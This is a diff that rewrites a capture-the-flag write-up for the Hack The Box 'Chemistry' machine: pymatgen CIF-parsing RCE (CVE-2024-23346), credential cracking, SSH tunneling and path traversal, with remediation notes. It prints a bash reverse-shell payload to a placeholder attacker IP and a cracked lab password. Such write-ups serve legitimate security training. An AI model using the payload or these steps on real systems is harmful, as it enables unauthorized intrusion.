@@ -1,216 +1,136 @@
-# Hack The Box — Chemistry
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-RCE%20%7C%20File%20Upload%20%7C%20Privilege%20Escalation-red)
+Chemistry is an Easy Linux machine running a Flask **CIF Analyzer** web app. The
+app parses uploaded CIF files with `pymatgen`, which is vulnerable to remote code
+execution (CVE-2024-23346), yielding a reverse shell. A local SQLite database
+exposes a password hash that, once cracked, grants SSH access as `rosa`. An
+internal AioHTTP service exposed on localhost is then abused via path traversal
+to read the **root** flag.
 
----
+## Machine Information
 
-# Machine Information
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| Chemistry | Easy | Linux | Hack The Box |
 
-| Name      | Difficulty | Platform     | OS    |
-| --------- | ---------- | ------------ | ----- |
-| Chemistry | Easy       | Hack The Box | Linux |
+## Attack Path
 
----
+1. Nmap reveals SSH and an HTTP service on port 5000.
+2. The web application allows authenticated CIF file uploads.
+3. A malicious CIF file exploits the pymatgen RCE (CVE-2024-23346).
+4. A reverse shell is obtained on the server.
+5. A local database file reveals a password hash.
+6. The hash is cracked and reused for SSH access as `rosa`.
+7. An internal service on localhost is reached through SSH tunneling.
+8. A path traversal vulnerability is exploited to read the root flag.
 
-# Attack Path
-
-```
-1. Nmap scan reveals SSH and HTTP service
-2. Web application allows CIF file upload
-3. Malicious CIF file exploits pymatgen RCE
-4. Reverse shell obtained on the server
-5. Database file discovered containing password hash
-6. Credentials cracked and SSH access gained as rosa
-7. Internal service discovered on localhost
-8. Path traversal vulnerability exploited
-9. Root flag retrieved
-```
-
----
-
-# Reconnaissance
+## Reconnaissance
 
 Initial enumeration was performed with **Nmap**.
 
-```
+```bash
 nmap -sC -sV -A 10.10.11.38
 ```
 
-![Nmap Scan](screenshots/nmap.png)
+| Port | Service |
+| --- | --- |
+| 22 | SSH |
+| 5000 | HTTP (Python Flask) |
 
-The scan revealed:
+The web application hosted a **CIF Analyzer** used to upload and analyze
+crystallographic files.
 
-| Port | Service                         |
-| ---- | ------------------------------- |
-| 22   | SSH                             |
-| 5000 | HTTP (Python Flask application) |
+## Web Enumeration
 
-The web application hosted a **CIF Analyzer** used to upload and analyze crystallographic files.
+The application exposed a login and registration system. After registering an
+account, the dashboard allowed users to **upload CIF files**.
 
----
+## Exploitation — pymatgen RCE (CVE-2024-23346)
 
-# Web Enumeration
+The application uses the **pymatgen** library to process CIF files. The library
+parses user input with `eval()`, allowing arbitrary code execution when a
+crafted CIF file is parsed.
 
-Visiting the web application revealed a login and registration system.
-
-After registering an account, the dashboard allowed users to **upload CIF files**.
-
-![Upload Feature](screenshots/upload-cif.png)
-
----
-
-# Remote Code Execution
-
-The application uses the **pymatgen library** to process CIF files.
-
-This library contains a vulnerability where **eval() is used to process user input**, allowing arbitrary code execution when parsing malicious CIF files. ([Medium][1])
-
-A malicious CIF file was created containing a reverse shell payload.
-
-Example payload snippet:
+A malicious CIF file was created with a reverse shell payload:
 
 ```
 system("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'")
 ```
 
-After uploading the file and triggering the parser, a reverse shell was obtained.
+After uploading the file and triggering the parser, a reverse shell was
+received.
 
----
+## Credential Discovery
 
-# Credential Discovery
+Exploring the filesystem revealed a SQLite database containing stored
+credentials.
 
-While exploring the file system, a database file was discovered containing stored credentials.
-
-```
-database.db
-```
-
-![Database Hash](screenshots/database-hash.png)
-
-After extracting and cracking the hash, the following credentials were obtained:
-
-![Crack Hash](screenshots/crack.png)
-
-
-```
-User: rosa
-Password: unicorniosrosados
+```bash
+cat database.db
 ```
 
----
-
-# Initial Access
-
-Using the discovered credentials, SSH access was obtained.
+The extracted hash was cracked offline, revealing:
 
 ```
+rosa : unicorniosrosados
+```
+
+## Initial Access (User)
+
+The recovered credentials were reused to authenticate over SSH as `rosa`.
+
+```bash
 ssh rosa@10.10.11.38
 ```
 
-The **user flag** was located in the home directory.
+This provided the initial foothold on the system. The user flag lives at
+`/home/rosa/user.txt`.
 
-```
-cat user.txt
-```
+## Privilege Escalation
 
-![User Flag](screenshots/user-flag.png)
+### Enumeration
 
----
+Listing listening sockets revealed an internal service on `localhost:8080`.
 
-# Privilege Escalation
-
-Running `netstat` revealed an internal service running on **localhost:8080**.
-
-```
+```bash
 netstat -nltp
 ```
 
-![Internal Service](screenshots/port-forwarding.png)
+An SSH tunnel was used to reach the service from the attacker machine.
 
-Using SSH port forwarding:
-
-```
+```bash
 ssh -L 8888:127.0.0.1:8080 rosa@10.10.11.38
 ```
 
-The internal application was then accessed from the attacker machine.
+### Path Traversal (AioHTTP)
 
-The service contained a **path traversal vulnerability**, allowing arbitrary file reads.
+The internal application (running as root) was vulnerable to **path traversal**,
+allowing arbitrary file reads. This was abused to read the root flag directly
+from `/root/root.txt`.
 
-This was exploited to retrieve the **root flag**.
+## Vulnerability Analysis
 
----
+**Remote Code Execution in pymatgen (CVE-2024-23346)** — the app parsed uploaded
+CIF files with pymatgen, which processed input through `eval()`, enabling
+arbitrary code execution and the initial foothold. Fix: upgrade pymatgen, never
+pass untrusted input to `eval()`, and sandbox file-parsing routines.
 
-# Root Access
+**Path Traversal in the internal AioHTTP service** — an internal web application
+running as root allowed directory traversal, exposing arbitrary files including
+the root flag. Fix: normalize and validate requested paths, restrict the served
+root, and run the service unprivileged.
 
-After exploiting the vulnerability, the root flag was obtained.
+## Tools Used
 
-![Root Flag](screenshots/root-flag.png)
+- Nmap
+- Netcat
+- SSH
+- Hash cracking tools
+- Burp Suite
 
----
+## Key Takeaways
 
-# Flags
-
-### User Flag
-
-```
-584e2c.....................
-```
-
-### Root Flag
-
-```
-f4cad6.....................
-```
-
----
-
-# Vulnerabilities Identified
-
-### Remote Code Execution — pymatgen (CVE-2024-23346)
-
-The application used the pymatgen library to parse CIF files.
-The library insecurely processes input using `eval()`, enabling arbitrary code execution when parsing malicious files. ([Hack The Box][2])
-
----
-
-### Path Traversal — AioHTTP
-
-An internal web application allowed directory traversal, enabling access to sensitive files.
-
-Impact:
-
-* Arbitrary file read
-* Exposure of sensitive system files
-
----
-
-# Tools Used
-
-* Nmap
-* Netcat
-* SSH
-* Hash cracking tools
-* Burp Suite
-
----
-
-# Key Takeaways
-
-This machine demonstrates:
-
-* File upload vulnerabilities
-* Exploitation of insecure libraries
-* Reverse shell via malicious file
-* Credential extraction from databases
-* Exploiting internal services
-* Directory traversal for privilege escalation
-
----
-
-# Author
-
-GitHub: https://github.com/ninjaa-exe
+- File upload features that parse complex formats can hide RCE in their parsing libraries.
+- Insecure use of `eval()` in dependencies is a recurring, high-impact bug.
+- Local databases often store crackable credential hashes.
+- Internal services bound to localhost are still reachable after a foothold via tunneling.
